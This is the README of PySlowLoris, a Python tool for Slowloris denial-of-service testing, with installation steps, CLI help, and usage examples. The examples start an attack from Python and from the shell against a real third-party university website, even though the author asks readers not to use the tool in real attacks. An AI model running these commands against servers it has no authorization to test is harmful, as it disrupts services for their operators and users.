PySlowLoris
===========


.. image:: https://badges.gitter.im/gitterHQ/gitter.png
   :target: https://gitter.im/SlowLoris-dev/Lobby
   :alt: Gitter chat


.. image:: https://img.shields.io/badge/license-MIT%20license-orange.svg
   :target: https://github.com/maxkrivich/SlowLoris/blob/master/LICENSE
   :alt: License


.. image:: https://img.shields.io/badge/python-2.7-blue.svg
   :target: https://github.com/maxkrivich/SlowLoris
   :alt: Python


.. image:: https://travis-ci.org/maxkrivich/SlowLoris.svg?branch=master
   :target: https://travis-ci.org/maxkrivich/SlowLoris
   :alt: Build Status


.. image:: https://requires.io/github/maxkrivich/SlowLoris/requirements.svg?branch=master
   :target: https://requires.io/github/maxkrivich/SlowLoris/requirements/?branch=master
   :alt: Requirements Status


.. image:: https://landscape.io/github/maxkrivich/SlowLoris/master/landscape.svg?style=flat
   :target: https://landscape.io/github/maxkrivich/SlowLoris/master
   :alt: Code Health


.. image:: https://badge.fury.io/py/PySlowLoris.svg
   :target: https://badge.fury.io/py/PySlowLoris
   :alt: PyPI version


This repository was created for testing Slow Loris vulnerability on different web servers. SL based on keeping alive open connection as long as possible and sending some trash headers to the server. If you are interested what I'm trying doing here, please join my team and let's do fun together. Please DO NOT use this in the real attacks on the servers.

The main reason why I'm writing this module it is to create the easy tool for the fast check a small personal or corporate web server what based on Apache and etc. Also, last but not least reason is to improve my skills in this sphere.

More information you can find `here <https://en.wikipedia.org/wiki/Slowloris_(computer_security)>`_.

Installation
^^^^^^^^^^^^

PyPi
~~~~

To install PySlowLoris, run this command in your terminal:

.. code-block:: sh

   $ pip install pyslowloris

This is the preferred method to install PySlowLoris, as it will always install the most recent stable release.

Source files
~~~~~~~~~~~~

In case you downloaded or cloned the source code from `GitHub <https://github.com/maxkrivich/SlowLoris>`_ or your own fork, you can run the following to install cameo for development:

.. code-block:: sh

   $ git clone https://github.com/[username]/SlowLoris.git
   $ cd SlowLoris
   $ vitualenv --python=python[version] venv
   $ source venv/bin/active
   $ pip install --editable .

Docker Hub
~~~~~~~~~~

Pulling image from `Docker Hub <https://hub.docker.com/r/maxkrivich/pyslowloris/>`_ and run container:

.. code-block:: sh

   $ docker pull maxkivich/pyslowloris
   $ docker run --rm -it maxkivich/pyslowloris [-h] [-u URL] [-p PORT] [-s SOCKET_COUNT]

Also you can build image from `Dockerfile <https://github.com/maxkrivich/SlowLoris/blob/master/Dockerfile>`_ and run container: 

.. code-block:: sh

   $ docker build -t pyslowloris .
   $ docker run --rm -it pyslowloris [-h] [-u URL] [-p PORT] [-s SOCKET_COUNT]

**Note:** *Don't forget about 'sudo'!*

Basic Usage
^^^^^^^^^^^

Available command list:

.. code-block:: sh

   $ slowloris --help
   usage: slowloris [-h] [-u URL] [-s SOCKET_COUNT] [-p PORT]

   Small and simple tool for testing Slow Loris vulnerability

   optional arguments:
     -h                show this help message and exit
     -u URL            link to the web server (http://google.com) - str
     -s SOCKET_COUNT   maximum count of created connection (default value 300) - int
     -p PORT           port what will be used - int

Using PySlowLoris from code
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Here are some example to start attack from Python code

.. code-block:: py

   import time
   from PySlowLoris import TargetInfo, SlowLorisAttack

   target = TargetInfo(url="http://kpi.ua/", port=80)
   target.get_info()
   slowloris = SlowLorisAttack(target)
   slowloris.start_attack() # stop_attack()

   while True:
       time.sleep(1)

Using PySlowLoris from terminal
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The following command helps to use module from command line

.. code-block:: sh

   $ slowloris -u http://kpi.ua/ -s 300

stop execution: Ctrl + C
########################

Bugs, issues and contributing
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

If you find `bugs <https://github.com/maxkrivich/SlowLoris/issues>`_ or have `suggestions <https://github.com/maxkrivich/SlowLoris/issues>`_ about improving the module, don't hesitate to contact `me <https://maxkrivich.github.io>`_.

License
^^^^^^^

This project is licensed under the MIT License - see the `LICENSE <https://github.com/maxkrivich/SlowLoris/blob/master/LICENSE>`_ file for details

Copyright (c) 2017 Maxim Krivich

`maxkrivich.github.io <https://maxkrivich.github.io/>`_


